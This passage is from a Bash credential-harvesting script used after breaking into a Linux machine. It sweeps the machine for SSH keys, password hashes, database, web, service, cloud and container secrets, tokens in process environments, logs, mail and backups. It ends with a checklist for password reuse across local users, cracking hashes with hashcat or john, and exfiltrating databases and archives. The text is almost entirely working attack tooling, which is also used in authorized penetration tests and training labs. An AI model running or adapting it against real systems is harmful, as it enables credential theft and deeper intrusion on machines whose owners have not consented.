    # produced nothing but shipped defaults. Only live settings are of interest.
    for f in ${RP}/etc/ssh/ssh_config ${RP}/etc/ssh/sshd_config ${RP}/root/.ssh/config; do
        [ -r "$f" ] || continue
        _m=$(grep -nE "(IdentityFile|ProxyCommand|PasswordAuthentication|PermitRootLogin|PermitEmptyPasswords|^[[:space:]]*User )" "$f" 2>/dev/null \
             | grep -vE '^[0-9]+:[[:space:]]*#')
        [ -n "$_m" ] && { file_ "$f"; printf '%s\n' "$_m" | show; }
    done
    glob "${RP}/home/*/.ssh/config" | while IFS= read -r f; do grep_paths "(IdentityFile|ProxyCommand|User )" "$f"; done

    sub "private keys elsewhere on disk"
    grep -rlIE -e "$KEY_RE" ${RP}/etc ${RP}/opt ${RP}/srv ${RP}/var/www ${RP}/tmp ${RP}/var/tmp ${RP}/usr/local \
        "${GREP_EXCL[@]}" "${SELF_EXCL[@]}" 2>/dev/null | show
}

# ===========================================================================
# 5. Web application configs
# ===========================================================================
scan_web() {
    sect "5. Web application configs"

    local webroots="${RP}/var/www ${RP}/var/www/html ${RP}/srv/http ${RP}/srv/www ${RP}/usr/share/nginx ${RP}/opt/lampp/htdocs ${RP}/home/*/public_html ${RP}/usr/local/www ${RP}/var/lib/tomcat*/webapps ${RP}/opt/tomcat*/webapps"
    # /var/www and /var/www/html were both in the list, so a recursive grep
    # over each reported everything under html twice. Drop any webroot that
    # already sits inside an accepted one.
    local d f2 skip found=""
    for d in $webroots; do
        [ -d "$d" ] || continue
        skip=0
        for f2 in $found; do
            [ "$d" = "$f2" ] && skip=1
            case "$d" in "$f2"/*) skip=1 ;; esac
        done
        [ "$skip" -eq 0 ] && found="$found $d"
    done
    [ -z "$found" ] && note "no standard webroot found"

    sub "known config filenames"
    for d in $found; do
        find "$d" -maxdepth 6 -type f \( \
              -name 'wp-config.php' -o -name 'config.php' -o -name 'configuration.php' \
           -o -name 'settings.php' -o -name 'config.inc.php' -o -name 'db.php' \
           -o -name 'database.php' -o -name 'connect.php' -o -name 'LocalSettings.php' \
           -o -name 'settings.py' -o -name 'local_settings.py' -o -name 'config.py' \
           -o -name '.env*' -o -name 'database.yml' -o -name 'secrets.yml' \
           -o -name 'credentials.yml' -o -name 'application*.properties' \
           -o -name 'application*.yml' -o -name 'web.config' -o -name 'app.config' \
           -o -name 'config.json' -o -name 'appsettings*.json' \
           -o -name 'context.xml' -o -name 'server.xml' -o -name 'tomcat-users.xml' \
           -o -name 'standalone.xml' -o -name '.htpasswd' -o -name 'sites.ini' \
           -o -name 'config.ini' -o -name 'parameters.yml' -o -name 'wp-config-sample.php' \
           \) 2>/dev/null | while IFS= read -r f; do
            [ -r "$f" ] || continue
            file_ "$f"
            grep -aniE "$CRED_RE|$CONNFN_RE|DB_(USER|PASSWORD|NAME|HOST)" "$f" 2>/dev/null \
                | grep -aviE "$NOISE_RE" | show
        done
    done

    if [ "$QUICK" -eq 0 ]; then
        sub "generic credential grep across webroots"
        for d in $found; do
            grep -rniIE "$CRED_RE|$CONNFN_RE" "$d" \
                "${GREP_EXCL[@]}" "${SELF_EXCL[@]}" "${ASSET_EXCL[@]}" 2>/dev/null \
                | grep -aviE "$NOISE_RE" | show
        done
    fi

    sub "basic-auth / htpasswd files anywhere"
    dfind "${RP}/etc ${RP}/var/www ${RP}/srv ${RP}/opt" -type f \( -name '.htpasswd' -o -name 'htpasswd' \) \
        | while IFS= read -r f; do show_file "$f" 10; done

    sub "webserver config referencing auth files"
    grep_paths "(auth_basic_user_file|AuthUserFile|AuthName|proxy_pass.*@)" \
        ${RP}/etc/nginx/nginx.conf ${RP}/etc/apache2/apache2.conf ${RP}/etc/httpd/conf/httpd.conf
    grep -rniIE "(auth_basic_user_file|AuthUserFile)" ${RP}/etc/nginx ${RP}/etc/apache2 ${RP}/etc/httpd 2>/dev/null | show
}

# ===========================================================================
# 6. Databases
# ===========================================================================
scan_db() {
    sect "6. Database configs, dumps and data files"

    sub "server-side config"
    grep_paths "$CRED_RE" \
        ${RP}/etc/mysql/debian.cnf ${RP}/etc/mysql/my.cnf ${RP}/etc/my.cnf \
        ${RP}/etc/mysql/mysql.conf.d/mysqld.cnf ${RP}/etc/mysql/conf.d/*.cnf \
        ${RP}/etc/postgresql/*/main/pg_hba.conf ${RP}/var/lib/pgsql/data/pg_hba.conf \
        ${RP}/etc/redis/redis.conf ${RP}/etc/mongod.conf ${RP}/etc/mongodb.conf \
        ${RP}/etc/cassandra/cassandra.yaml ${RP}/etc/influxdb/influxdb.conf \
        ${RP}/etc/elasticsearch/elasticsearch.yml
    show_file ${RP}/etc/mysql/debian.cnf 20

    sub "client config"
    { glob "${RP}/root/.my.cnf"; glob "${RP}/home/*/.my.cnf"; glob "${RP}/root/.pgpass"; \
      glob "${RP}/home/*/.pgpass"; glob "${RP}/root/.mylogin.cnf"; } \
      | while IFS= read -r f; do show_file "$f" 20; done

    sub "SQL dumps and backups"
    fs_files | grep -E '\.(sql|sql\.gz|dump|bak\.sql)$' \
        | head -n 40 | while IFS= read -r f; do
        [ -r "$f" ] || continue
        file_ "$f"
        grep -aniE "(INSERT INTO .*(user|admin|account|login|member|credential)|CREATE USER|IDENTIFIED BY|GRANT .*IDENTIFIED)" "$f" 2>/dev/null | head -n 8 | show
    done

    sub "SQLite / embedded DBs (grep strings for creds)"
    dfind "${RP}/var ${RP}/opt ${RP}/srv ${RP}/home ${RP}/root ${RP}/usr/local" -type f \
        \( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' -o -name '*.db3' \) \
        -size -"${MAXSIZE_KB}"k 2>/dev/null | head -n 40 | while IFS= read -r f; do
        [ -r "$f" ] || continue
        if grep -qaiE "(password|passwd|hash|token|secret)" "$f" 2>/dev/null; then
            file_ "$f  (contains credential-ish strings)"
            note "inspect: sqlite3 '$f' '.tables' then dump the user table"
            strings "$f" 2>/dev/null | grep -aiE "$HASH_RE|$CRED_RE" | head -n 8 | show
        fi
    done

    sub "mysql/postgres data dirs readable?"
    for d in ${RP}/var/lib/mysql ${RP}/var/lib/postgresql ${RP}/var/lib/redis; do
        [ -d "$d" ] && [ -r "$d" ] && crit "readable data dir: $d  (mysql/user.MYD, pg_authid)"
    done
    [ -r "${RP}/var/lib/mysql/mysql/user.MYD" ] && crit "${RP}/var/lib/mysql/mysql/user.MYD readable - extract hashes with strings"

    # Embedded databases ship their contents as a replayable SQL script, so an
    # app's admin password sits there in plaintext with no database running.
    # Openfire's HSQLDB openfire.script is the classic example.
    sub "embedded databases and application data stores"
    grep_paths "$CRED_RE|$SQLINS_RE" \
        ${RP}/var/lib/openfire/conf/openfire.xml ${RP}/opt/openfire/conf/openfire.xml \
        ${RP}/etc/openfire/openfire.xml \
        ${RP}/var/lib/gitea/custom/conf/app.ini ${RP}/etc/gitea/app.ini \
        ${RP}/opt/gitea/custom/conf/app.ini ${RP}/etc/gogs/app.ini \
        ${RP}/var/www/nextcloud/config/config.php ${RP}/var/lib/nextcloud/config/config.php \
        ${RP}/var/www/owncloud/config/config.php \
        ${RP}/var/lib/redmine/config/database.yml ${RP}/etc/redmine/database.yml \
        ${RP}/var/lib/neo4j/conf/neo4j.conf ${RP}/etc/neo4j/neo4j.conf \
        ${RP}/var/lib/rundeck/etc/framework.properties \
        ${RP}/var/lib/pgsql/data/postgresql.conf \
        ${RP}/opt/solr/server/solr/*.properties

    dfind "${RP}/var/lib ${RP}/var/opt ${RP}/opt ${RP}/srv ${RP}/usr/local ${RP}/home" -type f \( \
          -name '*.script' -o -name '*.properties' -o -name '*.ldif' \
       -o -name '*.mv.db' -o -name '*.h2.db' -o -name 'app.ini' \
       -o -name '*.dat' -o -name '*.store' -o -name 'derby.properties' \) \
       -size -"${MAXSIZE_KB}"k | head -n 40 | while IFS= read -r f; do
        [ -r "$f" ] || continue
        if grep -qaiE "$CRED_RE|$SQLINS_RE" "$f" 2>/dev/null; then
            crit "$f"
            grep -aniE "$CRED_RE|$SQLINS_RE" "$f" 2>/dev/null | grep -aviE "$NOISE_RE" | show
        fi
    done
}

# ===========================================================================
# 7. Service configs
# ===========================================================================
scan_services() {
    sect "7. Service configuration files"

    sub "FTP"
    grep_paths "$CRED_RE" ${RP}/etc/vsftpd.conf ${RP}/etc/vsftpd/vsftpd.conf ${RP}/etc/proftpd/proftpd.conf \
        ${RP}/etc/proftpd.conf ${RP}/etc/pure-ftpd/pure-ftpd.conf ${RP}/etc/ftpusers
    { glob "${RP}/etc/vsftpd/*passwd*"; glob "${RP}/etc/pure-ftpd/pureftpd.passwd"; \
      glob "${RP}/etc/proftpd/ftpd.passwd"; } | while IFS= read -r f; do show_file "$f" 10; done

    sub "Samba / SMB"
    grep_paths "(password|passwd|username|valid users|guest)" ${RP}/etc/samba/smb.conf
    for f in ${RP}/etc/samba/smbpasswd ${RP}/var/lib/samba/private/smbpasswd \
             ${RP}/var/lib/samba/private/secrets.tdb ${RP}/etc/samba/passdb.tdb; do
        [ -r "$f" ] && crit "readable: $f  (pdbedit -L -w  /  strings)"
    done

    sub "Mail"
    grep_paths "$CRED_RE" ${RP}/etc/postfix/main.cf ${RP}/etc/postfix/sasl_passwd \
        ${RP}/etc/dovecot/dovecot.conf ${RP}/etc/dovecot/conf.d/*.conf ${RP}/etc/exim4/*.conf \
        ${RP}/etc/mail/sendmail.cf ${RP}/etc/msmtprc ${RP}/etc/ssmtp/ssmtp.conf
    show_file ${RP}/etc/postfix/sasl_passwd 10
    show_file ${RP}/etc/ssmtp/ssmtp.conf 20

    sub "VPN / wireless / dialup"
    grep_paths "$CRED_RE|auth-user-pass" ${RP}/etc/openvpn/*.conf ${RP}/etc/openvpn/*/*.conf \
        ${RP}/etc/wpa_supplicant/wpa_supplicant.conf ${RP}/etc/NetworkManager/system-connections/* \
        ${RP}/etc/ppp/chap-secrets ${RP}/etc/ppp/pap-secrets ${RP}/etc/ipsec.secrets
    show_file ${RP}/etc/ppp/chap-secrets 10
    show_file ${RP}/etc/ipsec.secrets 10
    glob "${RP}/etc/NetworkManager/system-connections/*" | while IFS= read -r f; do
        [ -r "$f" ] && grep_paths "psk|password" "$f"
    done

    sub "SNMP / LDAP / Kerberos / NFS"
    grep_paths "(community|rocommunity|rwcommunity|$CRED_RE)" ${RP}/etc/snmp/snmpd.conf ${RP}/etc/snmp/snmp.conf
    grep_paths "$CRED_RE|bindpw|rootpw" ${RP}/etc/ldap/ldap.conf ${RP}/etc/openldap/ldap.conf \
        ${RP}/etc/ldap.conf ${RP}/etc/nslcd.conf ${RP}/etc/pam_ldap.conf ${RP}/etc/sssd/sssd.conf \
        ${RP}/etc/slapd.conf ${RP}/etc/ldap/slapd.d/cn=config.ldif
    glob "${RP}/etc/krb5.keytab" | while IFS= read -r f; do [ -r "$f" ] && crit "readable keytab: $f"; done

    sub "Java / app servers"
    grep_paths "$CRED_RE" ${RP}/etc/tomcat*/tomcat-users.xml ${RP}/var/lib/tomcat*/conf/tomcat-users.xml \
        ${RP}/opt/tomcat*/conf/tomcat-users.xml ${RP}/usr/share/tomcat*/conf/tomcat-users.xml \
        ${RP}/opt/jboss/standalone/configuration/*.xml ${RP}/etc/jetty*/*.xml
    fs_files | grep -E '/(tomcat-users\.xml|jmxremote\.password)$' | head -n 10 | show

    sub "CI / automation / monitoring"
    grep_paths "$CRED_RE" ${RP}/var/lib/jenkins/config.xml ${RP}/var/lib/jenkins/credentials.xml \
        ${RP}/var/lib/jenkins/users/*/config.xml ${RP}/etc/gitlab/gitlab.rb \
        ${RP}/etc/zabbix/*.conf ${RP}/etc/nagios*/*.cfg ${RP}/etc/icinga*/*.conf \
        ${RP}/etc/grafana/grafana.ini ${RP}/etc/prometheus/*.yml
    [ -r "${RP}/var/lib/jenkins/secrets/master.key" ] && crit "Jenkins master.key readable - decrypt credentials.xml"

    sub "Misc daemons"
    grep_paths "$CRED_RE" ${RP}/etc/squid/squid.conf ${RP}/etc/squid3/squid.conf \
        ${RP}/etc/rsyncd.conf ${RP}/etc/rsyncd.secrets ${RP}/etc/cups/cupsd.conf \
        ${RP}/etc/default/* ${RP}/etc/sysconfig/* ${RP}/etc/supervisor/conf.d/*.conf \
        ${RP}/etc/systemd/system/*.service ${RP}/lib/systemd/system/*.service
    show_file ${RP}/etc/rsyncd.secrets 10
}

# ===========================================================================
# 8. Cloud / devops secrets
# ===========================================================================
scan_devops() {
    sect "8. Cloud, container and IaC secrets"

    sub "cloud CLI credentials"
    { glob "${RP}/root/.aws/credentials"; glob "${RP}/home/*/.aws/credentials"; \
      glob "${RP}/root/.config/gcloud/*.json"; glob "${RP}/home/*/.config/gcloud/*.json"; \
      glob "${RP}/root/.azure/*.json"; glob "${RP}/home/*/.azure/*.json"; \
      glob "${RP}/root/.oci/config"; } | while IFS= read -r f; do show_file "$f" 20; done

    sub "docker / kubernetes"
    { glob "${RP}/root/.docker/config.json"; glob "${RP}/home/*/.docker/config.json"; \
      glob "${RP}/root/.kube/config"; glob "${RP}/home/*/.kube/config"; \
      glob "${RP}/etc/kubernetes/*.conf"; } | while IFS= read -r f; do show_file "$f" 25; done
    grep_paths "$CRED_RE" ${RP}/var/run/secrets/kubernetes.io/serviceaccount/token
    fs_files | grep -E '/(docker-compose[^/]*\.ya?ml|Dockerfile)$' \
        | head -n 30 | while IFS= read -r f; do
        [ -r "$f" ] && grep -qaiE "$CRED_RE" "$f" 2>/dev/null && {
            file_ "$f"; grep -aniE "$CRED_RE" "$f" | grep -aviE "$NOISE_RE" | show; }
    done
    if [ -d "${RP}/var/lib/docker/containers" ] && [ -r "${RP}/var/lib/docker/containers" ]; then
        sub "container env vars (config.v2.json)"
        grep -rhoIE "\"[A-Z_]*(PASS|SECRET|KEY|TOKEN)[A-Z_]*=[^\"]+\"" ${RP}/var/lib/docker/containers 2>/dev/null | sort -u | show
    fi

    sub "IaC / config management"
    fs_files | grep -E '/group_vars/|/([^/]*\.tfstate[^/]*|[^/]*\.tfvars|vault\.ya?ml|inventory|hosts\.ini|ansible\.cfg|Vagrantfile|cloud-config[^/]*|user-data)$' \
        | head -n 40 | while IFS= read -r f; do
        [ -r "$f" ] || continue
        grep -qaiE "$CRED_RE" "$f" 2>/dev/null && {
            file_ "$f"; grep -aniE "$CRED_RE" "$f" | grep -aviE "$NOISE_RE" | show; }
    done
    glob "${RP}/var/lib/cloud/instance/user-data.txt" | while IFS= read -r f; do show_file "$f" 30; done
    glob "${RP}/etc/ansible/hosts" | while IFS= read -r f; do grep_paths "$CRED_RE|ansible_" "$f"; done

    sub "package manager / registry tokens"
    { glob "${RP}/root/.npmrc"; glob "${RP}/home/*/.npmrc"; glob "${RP}/root/.pypirc"; \
      glob "${RP}/home/*/.pypirc"; glob "${RP}/root/.gem/credentials"; \
      glob "${RP}/home/*/.gem/credentials"; glob "${RP}/root/.composer/auth.json"; \
      glob "${RP}/home/*/.composer/auth.json"; glob "${RP}/etc/apt/auth.conf"; \
      glob "${RP}/etc/apt/auth.conf.d/*"; } | while IFS= read -r f; do show_file "$f" 15; done

    sub "high-signal token formats anywhere in ${RP}/home ${RP}/root ${RP}/opt ${RP}/srv ${RP}/var/www ${RP}/etc"
    grep -rnoIE "$TOKEN_RE" ${RP}/home ${RP}/root ${RP}/opt ${RP}/srv ${RP}/var/www ${RP}/etc "${GREP_EXCL[@]}" 2>/dev/null | sort -u | show
}

# ===========================================================================
# 9. Git repositories
# ===========================================================================
scan_git() {
    sect "9. Git repositories (config, history, stashed secrets)"

    dfind_paths "$SWEEP_DIRS" -type d -name '.git' | head -n 25 | while IFS= read -r g; do
        local repo="${g%/.git}"
        file_ "repo: $repo"
        grep_paths "(url = .*://[^/]*:[^@]*@|$CRED_RE)" "$g/config"
        [ -r "$g/../.git-credentials" ] && show_file "$g/../.git-credentials" 10
        # secrets committed then removed still live in the object store / packed refs
        if have git && [ -r "$g" ]; then
            git --git-dir="$g" log --oneline -n 5 2>/dev/null \
                | grep -iE "(pass|secret|cred|key|token|remove|revert)" | show
        fi
    done
}

# ===========================================================================
# 10. Cron, systemd timers, and the scripts they call
# ===========================================================================
scan_cron() {
    sect "10. Cron jobs, timers and referenced scripts"

    sub "crontabs"
    for f in ${RP}/etc/crontab ${RP}/etc/cron.d/* ${RP}/etc/anacrontab; do
        [ -r "$f" ] && { file_ "$f"; grep -avE '^\s*(#|$)' "$f" 2>/dev/null | show; }
    done
    glob "${RP}/var/spool/cron/crontabs/*" | while IFS= read -r f; do show_file "$f" 20; done
    glob "${RP}/var/spool/cron/*" | while IFS= read -r f; do [ -f "$f" ] && show_file "$f" 20; done

    sub "credentials inside cron/init/systemd scripts"
    grep -rniIE "$CRED_RE" ${RP}/etc/cron* ${RP}/etc/init.d ${RP}/etc/systemd ${RP}/lib/systemd \
        ${RP}/usr/local/bin ${RP}/usr/local/sbin ${RP}/opt "${GREP_EXCL[@]}" 2>/dev/null \
        | grep -aviE "$NOISE_RE" | show

    sub "scripts using sshpass / curl -u / mysql -p / wget --password"
    grep -rniIE "(sshpass|curl[^|]*-u[[:space:]]+[^[:space:]]+:[^[:space:]]+|mysql[[:space:]][^|]*[[:space:]]-p[^[:space:]-]|wget[^|]*--password|smbclient[^|]*-U|rsync[^|]*--password-file|expect[[:space:]]+.*pass)" \
        ${RP}/etc ${RP}/opt ${RP}/usr/local ${RP}/home ${RP}/root ${RP}/srv ${RP}/var/www \
        "${GREP_EXCL[@]}" "${SELF_EXCL[@]}" "${ASSET_EXCL[@]}" 2>/dev/null \
        | grep -aviE "$NOISE_RE" | show
}

# ===========================================================================
# 11. Live process memory-adjacent: cmdline and environ
# ===========================================================================
scan_procs() {
    sect "11. Running processes and their environments"

    # ps/env/mount read the kernel's view of THIS host. Under -r we are looking
    # at a mounted image or a subtree, so those would describe the wrong system.
    if [ -n "$RP" ]; then
        note "skipped: -r is set, and process state only exists on the live host"
        return 0
    fi

    sub "credentials on process command lines"
    # Two things were wrong here: "-p[^space]" matched the -p inside every
    # kernel thread name ([edac-poller], [irq/24-pciehp]), and those 25 lines
    # then consumed the whole display budget. Kernel threads are bracketed in
    # ps output, so drop them outright, and require -p to start an argument.
    ps -eo user,pid,args 2>/dev/null \
        | grep -avE '\[[^][]*\][[:space:]]*$' \
        | grep -aiE "([[:space:]]-p[^[:space:]-]|--password|--passwd|--pass[=[:space:]]|[[:space:]]-U[[:space:]]*[^[:space:]]+:|sshpass|PGPASSWORD|MYSQL_PWD|--token[=[:space:]]|--api-?key|secret)" \
        | grep -avE "(grep|credhunt|ps -eo)" | show

    sub "readable ${RP}/proc/<pid>/environ containing secrets"
    local p
    for p in ${RP}/proc/[0-9]*; do
        [ -r "$p/environ" ] || continue
        tr '\0' '\n' < "$p/environ" 2>/dev/null \
            | grep -aiE "(pass|secret|token|api[-_]?key|credential)=." \
            | grep -aviE "$NOISE_RE" | sed "s|^|$(cat "$p/comm" 2>/dev/null): |" | show
    done

    sub "our own environment"
    env 2>/dev/null | grep -aiE "(pass|secret|token|key|cred)=." | show

    sub "mounted shares carrying credentials in mount options"
    mount 2>/dev/null | grep -aiE "(username=|password=|credentials=)" | show
    grep -aiE "(username=|password=|credentials=)" ${RP}/etc/fstab 2>/dev/null | show
}

# ===========================================================================
# 12. Logs and mail
# ===========================================================================
scan_logs_mail() {
    sect "12. Logs and mail spools"

    sub "auth logs (passwords typed into the username field, sudo commands)"
    for f in ${RP}/var/log/auth.log ${RP}/var/log/secure ${RP}/var/log/audit/audit.log; do
        [ -r "$f" ] || continue
        file_ "$f"
        grep -aniE "(Failed password for invalid user|Invalid user|USER=.*COMMAND=.*(pass|-p )|authentication failure.*user=)" "$f" 2>/dev/null \
            | tail -n "$MAX_HITS" | show
    done

    sub "credential strings in other logs"
    grep -rniIE "$CRED_RE" ${RP}/var/log --include='*.log' "${GREP_EXCL[@]}" 2>/dev/null \
        | grep -aviE "$NOISE_RE" | show

    sub "mail spools (creds are frequently mailed to users on OSCP boxes)"
    _seen=""
    { glob "${RP}/var/mail/*"; glob "${RP}/var/spool/mail/*"; glob "${RP}/root/mbox"; \
      glob "${RP}/home/*/mbox"; glob "${RP}/home/*/Maildir/new/*"; } | while IFS= read -r f; do
        [ -f "$f" ] && [ -r "$f" ] || continue
        _c=$(readlink -f "$f" 2>/dev/null || printf '%s' "$f")
        case " $_seen " in *" $_c "*) continue ;; esac
        _seen="$_seen $_c"
        file_ "$f"
        grep -aniE "(pass|credential|login|account|temporary|username)" "$f" 2>/dev/null | head -n 10 | show
    done
}

# ===========================================================================
# 13. Backups, archives, and world-readable oddities
# ===========================================================================
scan_backups() {
    sect "13. Backup files, archives and stray writable/readable loot"

    sub "backup-suffixed files"
    dfind "${RP}/etc ${RP}/opt ${RP}/srv ${RP}/var/www ${RP}/home ${RP}/root ${RP}/usr/local ${RP}/tmp ${RP}/var/tmp" -type f \
        \( -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*.save' \
        -o -name '*.swp' -o -name '*.swo' -o -name '*~' -o -name '*.backup' \
        -o -name '*.copy' -o -name '*.tmp' \) 2>/dev/null | head -n 60 | while IFS= read -r f; do
        [ -r "$f" ] || continue
        if grep -qaiE "$CRED_RE|$HASH_RE" "$f" 2>/dev/null; then
            crit "$f"
            grep -aniE "$CRED_RE|$HASH_RE" "$f" 2>/dev/null | grep -aviE "$NOISE_RE" | show
        else
            note "$f"
        fi
    done

    sub "archives in unusual places (extract and re-scan these by hand)"
    dfind "${RP}/tmp ${RP}/var/tmp ${RP}/dev/shm ${RP}/opt ${RP}/srv ${RP}/home ${RP}/root ${RP}/var/backups" -type f \
        \( -name '*.tar' -o -name '*.tar.gz' -o -name '*.tgz' -o -name '*.zip' \
        -o -name '*.7z' -o -name '*.rar' -o -name '*.gz' -o -name '*.bz2' \) \
        2>/dev/null | grep -avE "$BUNDLED_RE" | head -n 40 | show

    sub "world-readable files in other users' homes"
    dfind "${RP}/home ${RP}/root" -maxdepth 3 -type f -perm -004 ! -user "$(id -un)" \
        | head -n 40 | show

    sub "world-writable config-ish files"
    dfind "${RP}/etc ${RP}/opt ${RP}/srv ${RP}/usr/local" -type f -perm -002 | head -n 30 | show

    sub "recently modified files in likely loot dirs (last 10 days)"
    dfind "${RP}/home ${RP}/root ${RP}/opt ${RP}/srv ${RP}/var/www ${RP}/tmp" -type f -mtime -10 \
        | grep -avE '(credhunt|linpeas|LinEnum|pspy|lse\.sh|unix-privesc)' \
        | grep -avE "$GENERATED_RE" \
        | grep -avE "$BUNDLED_RE" \
        | grep -avE '\.(log|log\.[0-9]+|out)$' \
        | head -n 40 | show
}

# ===========================================================================
# 14. Generic sweep - curated dirs (normal) or whole filesystem (deep)
# ===========================================================================
scan_generic() {
    if [ "$QUICK" -eq 1 ]; then
        sect "14. Generic sweep - SKIPPED (quick mode)"
        return 0
    fi

    if [ "$DEEP" -eq 1 ]; then
        sect "14. Deep sweep - full filesystem grep under $ROOT (slow)"
        note "files < ${MAXSIZE_KB}KB, package and vendored trees pruned"
        prune_find0 | xgrep "$CRED_RE|$CONNFN_RE" \
            | grep -aviE "$NOISE_RE" | head -n 600 | show
    else
        sect "14. Generic sweep - admin-writable directories"
        note "run with -d to also grep package territory"
        # grep -r, not find|xargs: grep does its own traversal in C and
        # measured ~1.5x faster than piping a find through xargs here.
        local d
        for d in $SWEEP_DIRS; do
            [ -d "$d" ] || continue
            grep -rniIE "$CRED_RE|$CONNFN_RE" "$d" \
                "${GREP_EXCL[@]}" "${SELF_EXCL[@]}" "${ASSET_EXCL[@]}" \
                --exclude='*.log' --exclude='*.log.*' --exclude='*.gz' \
                --exclude='*.xz' --exclude='*.bz2' --exclude='*.zst' \
                --exclude='*.so' --exclude='*.so.*' --exclude='*.mo' \
                --exclude='*.jar' --exclude='*.class' --exclude='*.pyc' \
                --exclude='*.journal' --exclude='*.deb' --exclude='*.rpm' \
                --exclude-dir=Catalina --exclude-dir=.unpacked \
                2>/dev/null | grep -aviE "$NOISE_RE" \
                | grep -avE "$GENERATED_RE" | grep -avE "$SWEEP_SKIP_RE" \
                | head -n 200
        done | show

        # The file set is chosen with find rather than grep --include. On one
        # real run this pass emitted output byte-identical to the sweep above,
        # i.e. the --include filters were not taking effect; selecting the
        # files explicitly does not depend on any grep's glob handling.
        sub "config-shaped JS/TS (the rest of the asset tree is excluded)"
        dfind "$SWEEP_DIRS" -type f \( -name '*config*.js' -o -name '*env*.js' \
              -o -name '*settings*.js' -o -name '*secret*.js' -o -name '*config*.ts' \) \
            ! -name '*.min.js' -size -"${MAXSIZE_KB}"k \
            | head -n 60 | while IFS= read -r f; do
                grep -aniIE "$CRED_RE" "$f" 2>/dev/null | grep -aviE "$NOISE_RE" \
                    | sed "s|^|$f:|"
            done | head -n 40 | show
    fi

    sub "files whose *names* suggest secrets (outside home dirs)"
    dfind "${RP}/etc ${RP}/opt ${RP}/srv ${RP}/usr/local ${RP}/var ${RP}/tmp" -type f \( \
          -iname '*passw*' -o -iname '*cred*' -o -iname '*secret*' \
       -o -iname '*.kdbx' -o -iname '*token*' -o -iname '*.pem' -o -iname '*.key' \) \
       | grep -avE '/(usr/share|man|doc|\.git|pam\.d|ca-certificates|ssl/certs|pki/[^/]*)/' \
       | grep -avE '(credhunt|linpeas|LinEnum|pspy)' \
       | grep -avE "$GENERATED_RE" \
       | grep -avE "$BUNDLED_RE" \
       | grep -avE '^[^:]*/etc/(passwd|passwd-|group|group-)$' \
       | grep -avE '/var/lib/(cloud/instances/[^/]*/sem|pam)/' \
       | head -n 50 | while IFS= read -r f; do
        case "$f" in
            # A .pem or .key is far more often a public certificate than a
            # private key, so say nothing unless it really carries key material.
            *.pem|*.key|*.crt|*.cer|*.ppk)
                grep -qE -e "$KEY_RE" "$f" 2>/dev/null && crit "$f  (private key material)" ;;
            *)  note "$f" ;;
        esac
    done
}

# ===========================================================================
summary() {
    sect "Follow-up checklist"
    emit "$C_INFO" "  1. Password reuse: try every string found against su/ssh/mysql for EVERY local user"
    emit "$C_INFO" "     (cut -d: -f1,3 ${RP}/etc/passwd | grep -v nologin)"
    emit "$C_INFO" "  2. Hashes -> hashcat/john:  \$1\$=md5crypt(500)  \$6\$=sha512crypt(1800)  \$2y\$=bcrypt(3200)  \$y\$=yescrypt"
    emit "$C_INFO" "  3. Encrypted SSH keys -> ssh2john; KeePass .kdbx -> keepass2john"
    emit "$C_INFO" "  4. Exfil DBs/archives and inspect offline rather than on the target"
    emit "$C_INFO" "  5. Re-run after each privilege escalation - root sees files you could not"
    emit "$C_INFO" "  6. Not covered here (use a privesc script): sudo -l, SUID, capabilities, kernel exploits"
    [ -n "$OUTFILE" ] && emit "$C_INFO" "  Results saved to: $OUTFILE"

    sect "Time per section (slowest first)"
    printf '%s' "$TIMINGS" | sort -rn | head -n 6 | while IFS= read -r l; do
        emit "$C_INFO" "  $l"
    done
    emit "$C_SEC" ""
    emit "$C_SEC" "done in $(( $(date +%s) - START_T ))s."
}

# ===========================================================================
# Run one section, recording how long it took. The timing table at the end is
# there so you can see on YOUR target which section is costing the time,
# instead of guessing - boxes differ enormously in what they have installed.
TIMINGS=""
run() {
    local fn="$1" t0 t1
    t0=$(date +%s)
    "$fn"
    t1=$(date +%s)
    TIMINGS="${TIMINGS}$(printf '%4ds  %s' "$((t1 - t0))" "$fn")
"
}

main() {
    START_T=$(date +%s)
    banner
    run fs_warm
    run scan_shadow
    run scan_userfiles
    run scan_history
    run scan_ssh
    run scan_web
    run scan_db
    run scan_services
    run scan_devops
    run scan_git
    run scan_cron
    run scan_procs
    run scan_logs_mail
    run scan_backups
    run scan_generic
    summary
}

main "$@"
